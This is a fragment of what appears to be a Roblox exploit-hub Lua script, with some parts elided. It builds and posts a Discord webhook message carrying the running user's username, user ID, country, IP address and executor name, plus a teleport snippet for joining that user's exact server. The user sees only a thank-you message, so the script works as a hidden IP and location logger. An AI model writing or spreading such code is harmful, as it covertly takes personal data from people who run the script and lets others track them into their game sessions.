local HttpService        = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local WebhookUrl         = "https://discord.com/api/webhooks/…"

-- … (executor detection + IP lookup remain the same) …

local function buildWebhookPayload()
    local player      = game.Players.LocalPlayer
    local displayName = (player and player.DisplayName) or "Not Available"
    local userName    = (player and player.Name)        or "UnknownUser"
    local playerId    = (player and player.UserId)      or 0

    local placeId = tostring(game.PlaceId or 0)
    local jobId   = tostring(game.JobId or "")

    -- Prevent Discord from auto‐wrapping “TeleportToPlaceInstance(…)”
    local zeroWidth = "\u200B"
    local joinScript =
        "game:GetService('TeleportService'):TeleportToPlaceInstance" .. zeroWidth ..
        "(" .. placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"

    -- Fetch country + IP (or “Unknown” if it fails)
    local country, ipAddr = getIPInfo()  -- assume getIPInfo() is defined above

    -- <<< Here’s the one‐liner to get the *true* published name >>>
    local success, productInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
    end)
    local gameName = (success and productInfo and productInfo.Name)
                     and productInfo.Name
                     or "Unknown Game"

    local embeds = {
        {
            author = { name = "Zte Hub Server" },
            title  = userName .. " | " .. displayName,
            type   = "rich",
            color  = tonumber(0x00FF00),

            thumbnail = {
                url = 
                  "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?"
                  .. "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
            },

            fields = {
                { name = "Executor:",   value = tostring(executorName), inline = false },
                { name = "Country:",    value = tostring(country),      inline = false },
                { name = "IP Address:", value = tostring(ipAddr),       inline = false },
                { name = "Game Name:",  value = tostring(gameName),     inline = false },
            },
        },
        {
            title       = "Join Server Script",
            description = "```lua\n" .. joinScript .. "\n```",
            color       = tonumber(0x00FF00),
        },
    }

    return {
        Url     = WebhookUrl,
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = HttpService:JSONEncode({ content = "**Thanks for using the script!**", embeds = embeds }),
    }
end

-- … (sendWebhook() logic follows) …
